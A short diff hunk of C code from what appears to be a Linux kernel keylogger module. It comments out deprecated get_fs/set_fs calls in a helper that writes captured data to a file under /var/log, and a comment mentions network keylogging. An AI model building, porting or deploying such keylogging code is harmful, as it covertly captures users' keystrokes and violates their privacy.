@@ -35,18 +35,18 @@ extern int send_flag; // For network keylogging
 /* Function used for local logging inside /var/log */
 void write_to_file(char *buf, long len)
 {
-	mm_segment_t oldfs;
+	//mm_segment_t oldfs;
 	int ret;
 
 	if (!IS_ERR (fd)) {
-		oldfs = get_fs();
-		set_fs(get_ds());
+		//oldfs = get_fs();
+		//set_fs(get_ds());
 
 		ret = vfs_write(fd, buf, len, &foffset); 
 		foffset += len;
 		//do_sync_write(fd, buffer, readed, 0);
 
-		set_fs(oldfs);
+		//set_fs(oldfs);
 	}
 	
 }
